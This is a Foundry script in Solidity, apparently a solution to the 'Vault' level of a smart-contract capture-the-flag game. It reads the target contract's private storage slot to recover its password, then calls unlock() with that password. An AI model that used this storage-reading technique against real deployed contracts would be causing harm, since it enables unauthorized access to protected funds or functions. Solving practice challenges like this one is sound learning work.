// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IVault {
    function unlock(bytes32 _password) external;
}

// ================================================================
// │                          LEVEL 8 - VAULT                     │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IVault targetContract = IVault(targetContractAddress);

        bytes32 password = vm.load(targetContractAddress, bytes32(uint256(1)));
        console.log("Password: %s", bytesToString(password));

        vm.startBroadcast();
        targetContract.unlock(password);
        vm.stopBroadcast();
    }
}
